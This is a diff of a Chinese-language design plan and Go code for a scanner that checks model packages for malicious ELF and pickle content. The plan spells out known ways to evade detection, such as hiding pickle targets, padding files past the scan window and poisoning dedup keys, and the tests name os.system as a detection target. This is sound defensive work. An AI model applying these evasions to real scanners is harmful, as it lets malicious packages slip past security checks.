@@ -38,7 +38,7 @@ go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./inter
 | 覆盖范围 | **按内容嗅探**，再按类型分流（ELF / zip 容器 / gzip / pickle / numpy / 其余二进制）；扩展名清单只作为补充提示，不作唯一依据 | 改后缀即可绕过扩展名清单；内容才是事实 |
 | 分析深度 | **strings + ELF 结构 + 熵**，全部标准库 | 只有导入符号能抓住 stripped 二进制的外联；熵是识别加壳/加密载荷的唯一手段 |
 | 集成层 | **独立通道**，在 `StaticEngine` 之外，两种引擎部署都生效 | 做成第三个引擎名会让源码与二进制二选一；并入两个臂的 walk 会让两臂各自实现、互相漂移 |
-| LLM | **与源码同路径走 LLM**（finding 级复用 `VerifyReport`，文件级用二进制专用 prompt） | finding 级天然复用；文件级必须换 prompt，因为现有 prompt 明写"Python 代码文件"并用 ```python``` 包裹 |
+| LLM | **与源码同路径走 LLM**（finding 级复用 `VerifyReport`，文件级用二进制专用 prompt） | finding 级天然复用；文件级必须换 prompt，因为现有 prompt 明写"Python 代码文件"并用 ```python``` 包裹。文件级这一支今天只被 mock 驱动、不是线上行为（生产的 `teellm.Client` 无 `AnalyzeFile`），见 Task 13 的诚实性注 |
 
 ### 0.4 提交约定
 
@@ -69,7 +69,7 @@ go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./inter
 | 文件 | 改动 |
 | --- | --- |
 | `internal/codeaudit/rules.go` | `Finding` 增 3 个二进制字段；`Report` 增 `Binary`；`ProvesCleanScan()` 折入二进制完整性 |
-| `internal/codeaudit/audit.go` | `AuditMetadata` 增二进制字段；`ruleSuggestionMap` 增 3 条；`AssembleAuditReport` 从 `scanReport.Binary` 抄元数据 |
+| `internal/codeaudit/audit.go` | `AuditMetadata` 增二进制字段；`ruleSuggestionMap` 增二进制规则条目；`AssembleAuditReport` 从 `scanReport.Binary` 抄元数据 |
 | `internal/codeaudit/verifier.go` | 新增 `AuditConfig`；`GenerateAuditReport` 接 `AuditConfig`、插入 Phase 1b/1c；新增 `analyzeBinaryFileWithLLM` 与二进制 prompt；`analyzeFileWithLLM` 增 evidence 参数 |
 | `internal/codeaudit/llm_test.go` | `mockLLMClient` 增 `filePrompts` 捕获字段 |
 | `internal/codeaudit/{audit_test,llm_absence_test,engine_select_test}.go` | 机械更新 `GenerateAuditReport` 调用点（共 11 处） |
@@ -93,9 +93,19 @@ go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./inter
 4. **`CheckImportWithLLM` 不接二进制通道**。生产路径是 `GenerateAuditReport`（`internal/controller/import_processing.go:642`）；`CheckImportWithLLM` 只被 `llm_test.go` 使用，是第二个 gate 实现。本版不改它，**它的语义由此与生产不同**，这一点写在它的 doc comment 里。
 5. **不做二进制瘦身/反编译/符号执行**。证据是"这个文件导入了什么、说了什么、熵是多少"，不是控制流。
 6. **纯数据文件不做熵判定**。`KindRaw`（权重、张量、未知二进制）与 `KindNumpy` 只产出 strings 与 pickle 目标证据，不产出熵行。理由：模型包里绝大多数字节就是权重，权重天然接近均匀分布，整文件熵规则会对每一个 `.safetensors` 误报；而本平台不执行裸数据文件，能运行的载荷一定以 ELF 或 pickle 形式出现，两者都有精确证据（可执行节区熵 / `GLOBAL` 目标）。**代价明确**：一个以 `.bin` 投递、再由包内某个 `.so` 解密的加密载荷，其密文本身不会被判为加壳。
-7. **pickle 目标识别基于 opcode 相邻性，可被受控流规避**。`STACK_GLOBAL`（`0x93`）的模块名与属性名来自它前面紧邻的两个字符串 opcode；把模块名先 `MEMOIZE`、再用 `BINGET` 取回，相邻性就不成立，本版的扫描器看不到这个目标。`GLOBAL`（`c module\nname\n`）不受此影响，因为它自带两个内联字符串。**代价明确**：一个刻意构造的 pickle 可以让它的 `STACK_GLOBAL` 目标不出现在证据里。这不改变 fail-closed 的边界——漏读的是"证据"，不是"读取"本身，所以报告仍会因为它读到的其他东西（`GLOBAL`、strings、导入符号）作判断，只是这一条线索不可依赖。真正的修法是做一个有 memo 表的 pickle 虚拟机，那是本版明确不做的（见第 5 条）。
+7. **pickle 目标识别用带 memo 表的 opcode 解释器，识别能力上界于整个 opcode 流，而不是"相邻字节模式"**。扫描器不再按字节找形状，而是按 pickle 语法逐 opcode 前进：每个 opcode 的操作数宽度取自协议 0–5 的完整表（68 个 opcode，无一遗漏），字符串/字节操作数按它自带的长度前缀整体消费，因此数据段里偶发的 `0x63` 与换行不能再让扫描器错位——实测旧扫描器在 `net_001.pth` 的 `data.pkl` 上报出 39 个目标、漏掉 `torch.LongStorage`，解释器报出且只报出 4 个真目标；这也证伪了"`GLOBAL` 因自带两个内联字符串而不受相邻性影响"的旧说法，被吞掉的正是 offset 828 的一条 `GLOBAL`。`GLOBAL`（`c module\nname\n`）、`STACK_GLOBAL`（`0x93`，取值栈顶两项）与 `INST`（`i module\nname\n`）同步产出，模块名先 `MEMOIZE`/`BINPUT`/`PUT`、再用 `BINGET`/`GET` 取回时取回的值仍在值栈上，所以"先存 memo 再取回"这条规避对解释器不成立。仍然看不见的目标有三类：被抽取预算截断的 opcode 流、从进程扩展注册表解析的 `EXT1/EXT2/EXT4` 与走持久化 id 的 `PERSID`/`BINPERSID`（目标名根本不在流里）、以及解释器无法继续时（未知 opcode、mid-opcode 结束、`STACK_GLOBAL` 操作数无法解析）——后者会置 `Bound.Structural`，对可执行类型即阻断导入，也就是说"看不见"只会表现为"没证据"或"阻断"，不会表现为"扫干净了"。**代价明确**：解释器会在它声称解析的流上留痕，所以它只跑在**被声明为 pickle 的流**上（`KindPickle` 的整文件与容器成员、解压后头部嗅探为 pickle 的 gzip 流，见 Task 4 的门控规则），于是一个把 `GLOBAL` 放在预算之外、或完全依赖扩展注册表/持久化 id 的加载器，其目标不会以 `pickle` 证据出现；贴在张量文件尾部、其头部不携带 pickle 魔数的 pickle 也不再被认领——旧字节扫描器认领它，正因为它从不承诺自己在解析；本平台没有加载器会对 `.bin`/`.safetensors` 调 `pickle.loads`，其字面量仍由 strings 通道读出，但少了 `SourcePickle` 那一条。
 8. **超过 `MaxFullScanBytes`（64 MiB）的文件只读首尾各 1 MiB**。这次跳过会按 `isExecutableKind` 的既有分野记账：`KindRaw`（张量、未知二进制）计入 `BoundedData`——可见、不阻断；`KindELF` 与 `KindPickle` 计入 `BoundedExecutable`——**fail-closed 下即阻断导入**。后半条是必须的：若窗口化不留痕，把一个 pickle 填充到 64 MiB 以上就能藏住中段的 `GLOBAL` 并且照样通过，阈值本身就成了绕过手段。**代价明确**：一个大于 64 MiB 的 `.so` 或 pickle 会被判为未完整扫描而阻断，出路是 operator 调高 `maxFullScanBytes`（这也是该配置项存在的理由），不是被静默豁免。就信息损失本身：`KindRaw` 的中段是张量数据，本平台不存在读它的加载器；`KindPickle` 的中段可能藏着一条 `GLOBAL`（在一长串数据构建 opcode 中间），首尾窗口覆盖加载时执行的前段与数据就绪后动作的后段，中段是缺口。本仓库全部语料中最大的 pickle 是 10.8 MiB，离阈值有 6 倍余量。
-9. **合并两个通道的 finding 时不再二次限流**。源码臂保有自己的 200，二进制臂保有自己的 50，合并列表不设上限（见 Task 11）。**代价明确**：极端情况下 Tier 2 的 LLM 调用上界从 200 变成 250。这个上界换的是别的东西：共享配额会让大源码臂按路径字典序挤掉二进制 finding，并且——因为触顶即 `Truncated`、`Truncated` 即 `ProvesCleanScan()` 为假、为假即删包——会把一个本来能导入的包变成被删的包。已入库语料的实测最大 finding 数是单样本 7、整语料 80，两个上限都远未接近，所以保护模型的从来是那个阻断，不是配额。
+9. **合并两个通道的 finding 时不再二次限流，且二进制臂的 finding 上限不参与完整性判定**。源码臂保有自己的 200，二进制臂保有自己的 50，合并列表不设上限（见 Task 11）。上限只落在**清单**上：触顶写 `findings_capped`/`findings_dropped`，不写 `Report.Truncated`，也不进 `ProvesCleanScan()`；并且 cap **从不丢任何能阻断的 finding**（`assist` 下 HIGH 阻断，`gate` 下 HIGH 与 MEDIUM 都阻断，所以 cap 只花 LOW 这一档），一个包不可能靠堆 LOW finding 把能阻断的 finding 挤出清单。**代价明确**：极端情况下 Tier 2 的 LLM 调用上界从 200 变成 250；且若一个包里能阻断的 finding 数本身就超过上限，清单会**超过**那个数字（这是刻意的取舍——宁可清单变长，不可让一个阻断级 finding 消失）。这个上界换的是别的东西：共享配额会让大源码臂按路径字典序挤掉二进制 finding，而二进制 finding 是这里唯一能看见 `.so` 与 pickle 的证据。已入库语料的实测最大 finding 数是单样本 7、整语料 80，两个上限都远未接近。
+10. **tar 不被解析**。`models/audit/holdout-sources/sr.tgz` 是 gzip 包 tar（解压后 10.66 MB、4933 个条目，一整个 `semgrep-rules-develop` 检出），解压后的字节会被读取并扫过 strings 通道，所以其中的字面量可见。**代价明确**：tar 的结构全部丢失——没有按成员归属、没有按成员分类（tar 里的 ELF 拿不到节区与导入符号证据）、也不会递归进 tar 里的归档；并且 tar 字节不会命中 pickle 门控（第 7 条），pickle 解释器不跑在它上面，tar 里的 pickle opcode 只有恰好构成可打印串时才以 strings 证据出现。
+11. **嵌套归档只递归一层**。`models/examples/Retina-DKD/Retina-DKD-code.zip` 把 `net_001.pth`/`net_005.pth` 作为成员携带，它们分类为 `KindArchive`；`collectArchive` 只对分类为 ELF 或 pickle 的成员下钻，因此这两个 checkpoint 不会被打开，其 `data.pkl` 永远到不了 pickle 解释器。**代价明确**：只装在 zip 里的 checkpoint 既不产出成员证据也不产出 pickle 目标；这一条现在由第 7 条的门控放大——解释器只跑在被声明为 pickle 的流上，而嵌套归档里那条流既没被声明、也没被下钻，没有第二次机会被发现；跳过是静默的（成员名与大小进了证据列表，但不置 `Bounded`）。
+12. **`.xlsx` 就是 zip**。语料里的 14 个 `.xlsx` 中 13 个是普通 zip（最坏压缩比 22.91，无炸弹形状，成员均分类为非可执行），第 14 个 `models/examples/Retina-DKD/Retina-DKD/test_result.xlsx` 是 OLE2 老式 `.xls` 顶着 `.xlsx` 名，不匹配任何魔数，落到 `KindRaw`。**代价明确**：当作 zip 的那 13 个只按普通容器处理（成员头嗅探 + 成员名/大小），内部的 XML 不进任何结构化解析；当 OLE2 的那一个只拿 strings 证据，不会因为扩展名被当成 zip 打开。
+13. **配置里只暴露五个上限，其余固定在 `DefaultBinaryConfig`，这是有判据的选择而不是遗漏**。有键的是 `maxArchiveMembers`、`maxFindings`、`maxFullScanBytes`、`maxStreamBytes`、`highEntropyThreshold`；没有键的是 `MaxEvidenceLines`（默认 50000）、`HeadTailBytes`、`MaxArchiveMemberBytes`、`MaxStringLen`/`MinStringLen`。判据是**越界之后留下什么**。这里要先修正一处此前的误述：`Bound.Listing` 的天花板**不是"只影响显示"**——cap 就是匹配器的输入（`EvidenceSet.add` 在被 cap 拒绝的行上直接返回、不追加，`binary_scanner.go:242` 的 `MatchAll` 只读 `set.Lines`），被丢的是一条任何规则都没见过的行。所以 `80cecb3` 把 `else if set.Bound.Listing` 这段也按 kind 分流：可执行类型记 `BoundedExecutable`（丢的可能是阻断证据，于是 `ProvesCleanScan` 扣包），其余记 `BoundedData`（只可能丢自由字符串行，可见、不阻断）。分流按 kind 而不按 `Bound` 字段，是因为**能阻断的二进制 family 全都读结构来源**——`DYN_001`/`CMD_001`/`NET_002` 读 dynsym 与 `DT_NEEDED`、`BIN_001`/`BIN_002` 读节熵与导入符号、`PKL_001` 读 pickle 目标——而**只有可执行格式才产生这些行**；字符串那四个 family（`CMD_002`/`PER_002`/`FIL_002`/`ENV_002`）无一例外是 LOW，丢它们影响不了任何判定。这条判据因此落在**"这次越界能不能靠抬上限合法化解"**：`Bound.Structural` 的天花板在可执行类型上会**阻断导入**，而它触顶的形状正是"文件本来就很大"，抬上限是 operator 该有的出路，没有键就成了无法处置的阻断，所以必须暴露；`MaxEvidenceLines` 这类 `Bound.Listing` 天花板虽同样能在可执行类型上扣包，却**不给键**——触顶的形状是"单个文件把证据清单撑满了"，给一个调大的键等于把"这个文件不正常"换成"把门槛抬到够高就能过"，而出路本该是去看那个文件。`MaxStreamBytes` 正落在前者（记 `Bound.Structural`、必须暴露的那一类）——它只有在一个通过了 `MaxFullScanBytes` 的文件上才可能被触到，所以把 `maxFullScanBytes` 抬到 3 GiB 以上就会让它生效；两个键因此成对出现，并在同一处校验。`maxFindings` 是这条判据的**例外，并且是刻意进例外名单的**：它既不是结构性天花板（触顶只记 `findings_capped`，不阻断），也不是显示上限（它确实会让清单少一段）——它是一个**清单预算**，而预算该多大取决于部署愿意为噪声付多少钱、以及它想要的报告有多长，这两件事只有 operator 知道。默认 50 是按十个族、每族五条定的，真实语料的最大 finding 数是 80（整语料）和 7（单样本），所以 50 只在单个包同时命中很多族时才可能被触到。**代价明确**：这五个以外的上限调不了，调它们要改代码重新部署；而 `maxFindings` 调小只会丢 LOW，永远不会让一个能阻断的 finding（`assist` 与 `gate` 下的 HIGH，以及 `gate` 下的 MEDIUM）消失。
+14. **不存在"每节字节上限"，这是删除而不是省略**。曾有一版 `MaxSectionBytes`（默认 16 MiB），用来给 `io.ReadAll` 一个可执行节设上限；它会对**普通的大库**开火——一个足够大的 `.so`，`.text` 会跨过任何固定的节上限，而触顶记的是结构性 bound，于是"这个库比较大"变成了阻断导入的理由。**宿主实测**（`readelf -SW` 取每个真实共享对象最大的 `SHF_EXECINSTR` `PROGBITS` 节）：`libLLVM.so.20.1` 单节 **63 048 722 字节**、`libclang-18.so.18` **22 284 286**、Chrome 的 `liboptimization_guide_internal.so` **20 685 714**、`libwireshark.so.17.0.2` **20 175 571**、`libpython3.13.so.1.0` **2 770 082**——16 MiB 的节上限会在前四个上直接触顶。这与本计划其余部分的实测口径不同，值得点明：**审计语料 `models/` 下一个真实 `.so` 都没有**（`find models -name '*.so*'` 命中的 50 个全是 semgrep 的 `.sol` 规则文件），而用来标定误报的那套 ollama 共享库（28 个）单节最大 2 901 464 字节，**也不会**触到 16 MiB。也就是说这个上限的代价是**潜伏**的：它在任何已实测的输入上都不发作，只在一个包里带上一个真实大库时发作——而那正是本平台要接受的包形状（带加速库的模型包），所以它必须删掉而不是调大。现在节读取改为经 `countSection` 按固定块（`entropyChunkBytes`，64 KiB）流过 256 桶直方图，内存与节大小无关，节上限已无物可保护；每文件剩下的读取预算是 `MaxStreamBytes`，触到它才记结构性——宿主 600 个共享对象（去重后 **538** 个 ELF；把每个文件条目都算上是 **2027** 个）按这条路径全跑一遍，**0 个被判结构性、0 个无节表、0 个报错**，也就没有一个接近那个 3 GiB 的每文件预算。**代价明确**：调不了单个节的读取量（本来也不该调）；能调的只有每文件预算。**不要把它加回来**——加回来就是把"库比较大"重新变成阻断理由；也不要指望"把 16 MiB 调大一点"能解决，任何固定值都只是把发作点往后挪。
+15. **无节表（`len(ef.Sections) == 0`）的 ELF 记为结构性缺口，且 reason 只点名"没有节头表"**。熵检测的输入是可执行节，没有节表就没有可执行节，旧代码在这一段直接掉出去、不产生任何行也不产生任何 bound，于是"从未检查过"被报成了"没发现加壳"——这条 fail-open 已去掉。修的是**结论**而不是"补回 `DT_NEEDED`/`DT_SONAME`"：经 `PT_DYNAMIC` 恢复 needed/soname 需要先把 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移、再把 `DT_STRTAB` 的虚地址映射一次，这是一段独立的新解析逻辑，而它的产出对"有没有被加壳"不提供任何证据，所以本版不做。reason 措辞点名的是**节头表**而不是符号表：静态链接的二进制没有 `.dynsym` 但有 `.symtab`，它并不 stripped，说它"缺符号表"是假的；同理 `SHT_SYMTAB` **故意不做**符号证据的兜底来源——`.symtab` 里绝大多数是本文件自己定义的符号，拿它当能力证据就是去匹配程序自己的标识符，正是第 14 条那批误报的同一类。因此 Task 8 的规则表**不变**：没有引入新的 evidence source。宿主 600 个共享对象（去重后 538 个 ELF、枚举到 2027 个文件条目）里**0 个无节表**，所以这个形状在真实世界里确实少见——而恰恰因为它少见，"没见到"不能当成"不存在"，这才是它必须 fail-closed 而不是被静默略过的理由。**代价明确**：一个节表被删掉的正常文件（少见但存在，如某些加壳器与 `objcopy --strip-section-headers` 的产物）现在会被记为结构性缺口而不是干净通过；这是刻意方向——对可执行格式，"没看"不等于"干净"。
+16. **节声明长度越过文件末尾（或读不满）记为结构性缺口，`size=` 仍写声明长度**。判据是"读到的字节数 < 节头声明的字节数"，两种情况——`sh_offset`/`sh_size` 越过文件末尾，或触到 `MaxStreamBytes`——都是同一事实：熵值只覆盖一个**前缀**，所以这个数不报（报出来会和"整节测过"的数长得一样），替代它的是 `section .text declares N bytes, M readable` 这条结构化证据。`size=` 保持声明值，读者才能把声明长度与缺口配对看。**代价明确**：一个声明长度写错但内容正常的文件会被记为结构性缺口；这是刻意方向，理由同上。
+17. **自由字符串证据只判 LOW，且 `OBF_001` 在二进制臂被整个删掉**。判据是一条通则：**一条 finding 只有被文件无法偶然产生的结构背书时才可以判 HIGH**，而"某个字面量里出现了某个词"不是那种背书——`.pyc` 常量池会把相邻常量拼成一整段可打印串，二进制数据里遍地是长 base64 字母表串，所以按子串匹配的规则会把合法库判成恶意（实测：旧 `OBF_001` 命中 28 个合法共享库中的 23 个，旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc` 与 `security.cpython-312.pyc`）。因此字符串半边不借源码臂的 HIGH/MEDIUM id，改用独立 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`（两端锚定 token，`ENV_002` 不带 `(?i)`），`OBF_001` 不设族。**代价明确**：一个真正把 base64 载荷以字面量形式留在代码里的文件，其字符串证据不再单独产出 finding；它若真在运行，仍会以 ELF 导入符号或 pickle 目标等结构证据（HIGH）出现，而纯数据文件本来就不被本平台加载。**不要把它"修回去"**——把字符串匹配放宽回子串或把严重级抬回 HIGH，就是重新引入这批误报，而误报在这种设计下的终点是拒绝一次本该接受的导入，并留下一份说它不安全的报告。
+18. **pickle 解释器有两个固定上限（`pickleMaxStackSlots` / `pickleMaxMemoSlots`，各 `1<<20`），按第 13 条的判据它们"本该"有键，这里刻意不给，理由说得清楚**：第 13 条的判据是"越界会记 `Bound.Structural` 的天花板必须暴露，否则 operator 无法处置一次阻断"。两个上限都落在 `Bound.Structural` 上（`KindPickle` 是可执行类型，会阻断导入），但它们触及的不是"合法文件恰好很大"这一情形，而是"这段流根本不是 pickle"——真实语料里最深值栈 1007 槽、最大 memo 3669 条，距上限各有约 1000 倍与 280 倍余量，一个正常的 state dict 无论如何长都到不了 `1<<20`（映射按每项约两槽计，`1<<20` 槽覆盖约五十万项的映射，而最大实测映射是几万项）。也就是说，触顶意味着流在按每个字节推一个槽/一个 memo 项的方式自增，那是畸形或敌意输入的签名，不是"这个包比较大"；给这样的阻断配一个 operator 可调的键，等于允许把上限调到任意大，而上限存在的唯一目的就是限制它背后那块内存（栈约 24 MiB、memo 约 64 字节/项，都是"没有上限就长到 GB"的量）。**代价明确**：一个合法但极端到这两条线上的 pickle 会被判为未完整扫描而阻断，出路不是调键而是先确认它到底是不是 pickle。这与第 13 条的差别的量纲：`MaxStreamBytes` 会被一个真正的大文件触到，所以要暴露；这两个只会被一个不像 pickle 的流触到，所以固定。**不要把它们加进配置**——加进去就是把一个"这段流不合法"的判定，换成一个"把门槛抬高就能过"的旋钮。
+19. **`step` 的返回契约是承重的：它只在"缓冲区里没有它可以消费的东西"时返回 0，绝不在"完成了一个操作数"之后返回 0**。这是流式解析能声称"结果不依赖分块位置"的前提，也是 `Flush` 两条完整性消息（`ended mid-opcode` / `ended without STOP`）能当真的前提。曾经的缺陷正出在这里：一个计数操作数声明长度为 0 时，payload 相位没有消费任何字节就完成了它，却返回 0，被读成"还需要更多输入"，于是缓冲区尾部被搁置；当这个操作数落在最后一次 `Write` 里时，没有后续读来清空缓冲区，`Flush` 就把一个完整合法的 pickle 报成"没有 STOP"的结构性缺口——而 `KindPickle` 是可执行类型，这条缺口会拒绝这次导入并留下一份错误的报告。**这不是边界情况**：本仓库五个真实 `data.pkl` 的零长 `BINUNICODE`（状态字典的空串键）分别位于 offset 1315、1315、12830、52607、52607，也就是下一个待审的包就会中招。修法限定在 payload 相位：0 长完成之后带同一个 `b` 与 `absOff` 继续取下一个 opcode；`pickPhaseFixed` 与计数操作数的长度前缀路径（宽度至少 1 字节，必然消费至少 1 字节）没有这个场景，**不要为了"统一"把补丁搬进去**。**代价明确**：无——这条修正只把错误报的完整性换成正确的完整性。
 
 ---
 
@@ -428,6 +438,64 @@ func TestStringScannerCapsDistinctLinesAndRecordsIt(t *testing.T) {
 	}
 }
 
+// TestEvidenceSourcesDoNotShareADedupKey pins that the dedup key is namespaced
+// by source. All writers share one map, so a bare-text key lets one source
+// silence another: a model package whose string table contains the printable
+// literal "pickle:os.system" would occupy the key the pickle pass needs for a
+// genuine GLOBAL os.system target, and the rule that exists to catch "this file
+// unpickles a call to os.system" would never see it. That is an evasion an
+// attacker who controls the package can plant on purpose, so the string line and
+// the pickle line must both survive.
+func TestEvidenceSourcesDoNotShareADedupKey(t *testing.T) {
+	ev := newTestEvidence("x.bin", KindPickle)
+	s := newStringScanner(ev, DefaultBinaryConfig())
+	if _, err := s.Write([]byte("pickle:os.system")); err != nil {
+		t.Fatal(err)
+	}
+	s.Flush()
+
+	// The pickle scanner (Task 4) writes its targets through the same method.
+	ev.add(SourcePickle, 0, "os.system")
+
+	var sawString, sawPickle bool
+	for _, l := range ev.Lines {
+		if l.Source == SourceStrings && l.Text == "pickle:os.system" {
+			sawString = true
+		}
+		if l.Source == SourcePickle && l.Text == "os.system" {
+			sawPickle = true
+		}
+	}
+	if !sawString {
+		t.Error("the string line was removed; one source overwrote another's evidence")
+	}
+	if !sawPickle {
+		t.Error("the pickle target was dropped; a planted string literal silenced the pickle pass")
+	}
+}
+
+// TestStringScannerNormalizesAZeroConfig pins that the config is normalized
+// where it is consumed. A zero BinaryConfig gives MaxStringLen == 0, which the
+// scanner would read as "no byte may enter a run" while MinStringLen == 0 still
+// let flush emit a phantom empty line - every real string lost, and a listing
+// bound recorded instead of a structural one, which is a silent failure of
+// exactly the kind this completeness scheme exists to prevent.
+func TestStringScannerNormalizesAZeroConfig(t *testing.T) {
+	ev := newTestEvidence("x.bin", KindRaw)
+	s := newStringScanner(ev, BinaryConfig{})
+	if _, err := s.Write([]byte("hello world")); err != nil {
+		t.Fatal(err)
+	}
+	s.Flush()
+
+	if len(ev.Lines) != 1 || ev.Lines[0].Text != "hello world" {
+		t.Fatalf("lines = %+v, want one line \"hello world\"", ev.Lines)
+	}
+	if ev.Bound.Listing {
+		t.Error("Bound.Listing = true: a zero config was recorded as a listing bound instead of being normalized")
+	}
+}
+
 // TestStreamEvidenceReadsTheWholeFile pins that the pass is not silently
 // bounded: a literal past the first read chunk is found, and an unbounded pass
 // reports no bound at all.
@@ -516,7 +584,6 @@ go test ./internal/codeaudit/ -run 'TestString|TestStream' 2>&1 | head -20
 package codeaudit
 
 import (
-	"errors"
 	"fmt"
 	"io"
 	"os"
@@ -588,11 +655,12 @@ type Bounding struct {
 	// clean-scan verdict, because the unread part is exactly where a payload
 	// would live.
 	Structural bool
-	// Listing is set when the evidence listing hit its line cap. The file was
-	// read; not every distinct string in it is in the report. This is recorded
-	// because a reader should be able to see it, and it does not withhold a
-	// verdict on its own: a binary with sixty thousand distinct strings is a
-	// large binary, not an unexamined one.
+	// Listing is set when the evidence listing hit its line cap, so distinct
+	// lines were dropped rather than displayed. It does not withhold a verdict on
+	// its own, but it is not display-only either: the dropped lines are matcher
+	// input that no rule was shown, so the consumer decides by kind - the scanner
+	// counts a capped listing on an executable format as a bounded executable
+	// read, because there the dropped lines can be blocking evidence.
 	Listing bool
 	// Reason names the limit that fired, for the report. It is a string rather
 	// than an enum so that adding a limit does not change a wire type.
@@ -618,6 +686,96 @@ type EvidenceSet struct {
 	// seen is the deduplication set. It is unexported because it is an
 	// implementation detail of the extractors, not part of what a reader gets.
 	seen map[string]bool
+	// maxLines is the evidence line cap, resolved from the config by
+	// newEvidenceSet so that add - which every extractor calls - can enforce it
+	// without every caller carrying the config. newStringScanner sets it too,
+	// which is idempotent and keeps the cap on a set built by hand for the string
+	// path. Zero means unlimited, so a set built literally and handed to neither
+	// is uncapped: evidenceError is the only such set on a real path, and it is
+	// safe because a failed extraction has nothing appended to it. The test helper
+	// newTestEvidence builds one as well and relies on the trivial volume.
+	maxLines int
+}
+
+// newEvidenceSet builds the set for one file and resolves the config's line cap
+// here, once. Every extraction path must come through this rather than filling
+// the struct literally: a set built by hand leaves maxLines at zero, and add
+// reads zero as "unlimited", so the one path that forgot would silently lose the
+// per-file memory ceiling - which is exactly what the structured extractors,
+// none of which touch the string scanner, would otherwise all do.
+func newEvidenceSet(file string, kind BinaryKind, cfg BinaryConfig) *EvidenceSet {
+	cfg = normalizeBinaryConfig(cfg)
+	return &EvidenceSet{
+		File:     file,
+		Kind:     kind,
+		seen:     map[string]bool{},
+		maxLines: cfg.MaxEvidenceLines,
+	}
+}
+
+// markStructural records that the extraction of the file's structure was cut
+// short. The first reason wins, so the report names the limit that was reached
+// first rather than the last one a loop happened to notice.
+//
+// It lives here rather than with the extractors that call it most, because the
+// stream budget in streamEvidence is the first caller: this task's own tests
+// assert on the flag it sets.
+func (s *EvidenceSet) markStructural(reason string) {
+	if s.Bound.Structural {
+		return
+	}
+	s.Bound.Structural = true
+	s.Bound.Reason = reason
+}
+
+// markListing records that evidence lines were dropped by the listing cap, or
+// that one line was cut short at MaxStringLen. A listing never relabels a reason
+// already recorded - it writes only when Reason is empty - while a structural
+// reason does override one, because markStructural guards on Structural rather
+// than on Reason. Among reasons of the same class the first wins.
+//
+// That precedence is not a claim that a listing bound is harmless. A dropped line
+// is a line the matcher was never shown: add returns before appending it, so the
+// listing is the matcher's input rather than a view of it. Whether this bound
+// withholds a clean verdict is therefore a decision for the consumer, which knows
+// the file's kind - the scanner counts it BoundedExecutable for a format that
+// executes, where the dropped lines can be blocking evidence, and BoundedData
+// otherwise.
+func (s *EvidenceSet) markListing(reason string) {
+	s.Bound.Listing = true
+	if s.Bound.Reason == "" {
+		s.Bound.Reason = reason
+	}
+}
+
+// add records one evidence line, deduplicating on the pair (source, text).
+//
+// Every writer shares this map, so the key is namespaced by source. An
+// unnamespaced key lets one source silence another: a file containing the
+// printable literal "pickle:os.system" would otherwise occupy the key the
+// pickle pass uses for a genuine GLOBAL target, and the rule that exists to
+// catch "this file unpickles a call to os.system" would never see it. The NUL
+// separator cannot occur in string evidence, because isPrintableByte rejects
+// it, so two sources cannot build the same key.
+//
+// A line dropped by the cap is deliberately not recorded in the map: the map's
+// length is the live line count the cap is measured against, so recording it
+// would grow the structure without bound and defeat the ceiling the cap exists
+// for.
+func (s *EvidenceSet) add(src EvidenceSource, off int64, text string) {
+	if s.seen == nil {
+		s.seen = map[string]bool{}
+	}
+	key := string(src) + "\x00" + text
+	if s.seen[key] {
+		return
+	}
+	if s.maxLines > 0 && len(s.seen) >= s.maxLines {
+		s.markListing("evidence line cap reached")
+		return
+	}
+	s.seen[key] = true
+	s.Lines = append(s.Lines, EvidenceLine{Source: src, Offset: off, Text: text})
 }
 
 // DefaultBinaryMinStringLen is the shortest printable run kept as evidence. It
@@ -639,10 +797,10 @@ const evidenceReadChunk = 64 * 1024
 // printable bytes at least MinStringLen long, deduplicated, each tagged with the
 // offset of its first occurrence.
 type stringScanner struct {
-	cfg  BinaryConfig
-	set  *EvidenceSet
-	at   int64
-	run  []byte
+	cfg   BinaryConfig
+	set   *EvidenceSet
+	at    int64
+	run   []byte
 	runAt int64
 	// truncated marks that a run hit MaxStringLen, which is a listing bound: the
 	// tail of that run is not in the listing.
@@ -650,10 +808,14 @@ type stringScanner struct {
 }
 
 func newStringScanner(set *EvidenceSet, cfg BinaryConfig) *stringScanner {
-	if set.seen == nil {
-		set.seen = map[string]bool{}
-	}
-	return &stringScanner{cfg: cfg, set: set}
+	// The config is normalized here rather than trusted from the caller: this is
+	// the function that consumes it, and a zero value would be read as "no byte
+	// may enter a run" while still emitting a line, so a mis-set config would
+	// silently lose every string and record a listing bound instead of failing
+	// loudly.
+	cfg = normalizeBinaryConfig(cfg)
+	set.maxLines = cfg.MaxEvidenceLines
+	return &stringScanner{set: set, cfg: cfg}
 }
 
 // Write implements io.Writer. The run is carried across calls, so a literal
@@ -682,9 +844,8 @@ func (s *stringScanner) Write(p []byte) (int, error) {
 // up on files ending in a literal.
 func (s *stringScanner) Flush() {
 	s.flush()
-	if s.truncated && !s.set.Bound.Listing {
-		s.set.Bound.Listing = true
-		s.set.Bound.Reason = "string truncated at MaxStringLen"
+	if s.truncated {
+		s.set.markListing("string truncated at MaxStringLen")
 	}
 }
 
@@ -698,16 +859,7 @@ func (s *stringScanner) flush() {
 // emit records one distinct string. The first occurrence wins, so a literal
 // repeated through a file is one line tagged with where it starts.
 func (s *stringScanner) emit(text string, at int64) {
-	if s.set.seen[text] {
-		return
-	}
-	if s.cfg.MaxEvidenceLines > 0 && len(s.set.seen) >= s.cfg.MaxEvidenceLines {
-		s.set.Bound.Listing = true
-		s.set.Bound.Reason = "evidence line cap reached"
-		return
-	}
-	s.set.seen[text] = true
-	s.set.Lines = append(s.set.Lines, EvidenceLine{Source: SourceStrings, Offset: at, Text: text})
+	s.set.add(SourceStrings, at, text)
 }
 
 // isPrintableByte is the printable-ASCII predicate strings(1) uses, plus tab.
@@ -726,6 +878,10 @@ func isPrintableByte(b byte) bool {
 // makes the budget a decoration. Whether the file was too large is decided up
 // front from its size, so that a file that ends exactly at the budget is not
 // reported as bounded - a bound that did not cost anything is not a bound.
+//
+// This pass extracts strings only. The pickle interpreter is a second reader over
+// the same bytes and is wired in by Task 4, gated on set.Kind == KindPickle (the
+// gate rule is stated there); the shape of that patch is written out there.
 func streamEvidence(path string, set *EvidenceSet, cfg BinaryConfig, budget int64) error {
